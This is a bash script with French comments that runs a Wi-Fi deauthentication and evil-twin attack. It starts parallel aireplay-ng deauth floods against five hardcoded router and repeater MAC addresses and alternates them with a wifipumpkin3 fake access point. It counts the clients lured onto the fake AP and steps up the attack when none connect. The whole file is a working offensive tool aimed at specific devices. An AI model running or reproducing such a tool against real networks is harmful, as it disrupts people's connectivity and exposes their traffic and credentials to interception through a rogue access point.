#!/bin/bash
# ============================================================
#  deauth.sh — Multithread hit-and-run deauth
#
#  1 processus aireplay-ng par BSSID cible (en parallèle)
#  Cycle: kill AP → monitor → deauth burst parallèle → AP up
#  Cadence adaptive: augmente si 0 clients
#
#  Usage: sudo ./deauth.sh [DEAUTH_SECS] [AP_WINDOW]
# ============================================================

IFACE="wlan1"
CHANNEL=11

TARGETS=(
    "2C:3A:FD:80:E1:DB"   # Routeur 7530 — 2.4 GHz
    "2C:3A:FD:80:E1:DC"   # Routeur 7530 — 5 GHz
    "04:B4:FE:59:15:42"   # Répéteur     — 2.4 GHz
    "04:B4:FE:59:15:43"   # Répéteur     — 5 GHz
    "48:22:54:B3:8B:14"   # Fritz 5490 EXT
)

DEAUTH_SECS=${1:-5}
AP_WINDOW=${2:-15}

echo "============================================="
echo "  DEAUTH MULTITHREAD"
echo "  ${#TARGETS[@]} cibles en parallèle"
echo "  Burst: ${DEAUTH_SECS}s | AP window: ${AP_WINDOW}s"
echo "  Cadence adaptive (accélère si 0 clients)"
echo "  Ctrl+C → restaure l'AP"
echo "============================================="

[ -z "$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')" ] && \
    echo "[!!!] eth0 DOWN — abandon." && exit 1

restore_ap() {
    echo ""
    echo "[*] Kill deauth processes..."
    pkill -f "aireplay-ng.*$IFACE" 2>/dev/null
    sleep 0.5
    echo "[*] Restauration AP..."
    ip link set $IFACE down 2>/dev/null
    iw dev $IFACE set type managed 2>/dev/null
    ip link set $IFACE up 2>/dev/null
    docker start wifipumpkin3 >/dev/null 2>&1
    echo "[+] AP relancé. Fin."
    exit 0
}
trap restore_ap EXIT INT TERM

CYCLE=0
CONSECUTIVE_ZERO=0

while true; do
    CYCLE=$((CYCLE + 1))

    # ── PHASE DEAUTH ─────────────────────────────
    echo ""
    echo "[$(date +%H:%M:%S)] ═══ CYCLE #$CYCLE — DEAUTH ═══"
    docker kill wifipumpkin3 >/dev/null 2>&1
    sleep 0.3

    ip link set $IFACE down
    iw dev $IFACE set type monitor
    ip link set $IFACE up
    iw dev $IFACE set channel $CHANNEL

    # Lancer 1 aireplay-ng par cible EN PARALLÈLE (background)
    PIDS=()
    for T in "${TARGETS[@]}"; do
        aireplay-ng --deauth 0 -a "$T" $IFACE >/dev/null 2>&1 &
        PIDS+=($!)
        echo "  [+] PID $! → $T"
    done
    echo "  [*] ${#PIDS[@]} threads deauth actifs — burst ${DEAUTH_SECS}s..."

    sleep $DEAUTH_SECS

    # Kill tous les aireplay
    for P in "${PIDS[@]}"; do kill $P 2>/dev/null; done
    wait 2>/dev/null
    echo "  [*] Burst terminé"

    # ── PHASE AP ─────────────────────────────────
    echo "[$(date +%H:%M:%S)] ═══ CYCLE #$CYCLE — AP UP ═══"
    ip link set $IFACE down
    iw dev $IFACE set type managed
    ip link set $IFACE up
    docker start wifipumpkin3 >/dev/null 2>&1
    sleep 6

    STATIONS=$(iw dev $IFACE station dump 2>&1 | grep -c "^Station")
    echo "  [★] $STATIONS clients connectés au fake AP"

    # ── CADENCE ADAPTIVE ─────────────────────────
    if [ "$STATIONS" -eq 0 ]; then
        CONSECUTIVE_ZERO=$((CONSECUTIVE_ZERO + 1))
        if [ "$CONSECUTIVE_ZERO" -ge 3 ]; then
            # Augmenter l'agressivité
            DEAUTH_SECS=$((DEAUTH_SECS + 2))
            [ $DEAUTH_SECS -gt 15 ] && DEAUTH_SECS=15
            AP_WINDOW=$((AP_WINDOW - 3))
            [ $AP_WINDOW -lt 8 ] && AP_WINDOW=8
            echo "  [!] Cadence ↑ : burst=${DEAUTH_SECS}s, ap_window=${AP_WINDOW}s"
            CONSECUTIVE_ZERO=0
        fi
    else
        CONSECUTIVE_ZERO=0
        # Succès: relâcher un peu
        DEAUTH_SECS=${1:-5}
        AP_WINDOW=${2:-15}
    fi

    echo "  [*] AP active ${AP_WINDOW}s..."
    sleep $AP_WINDOW
done
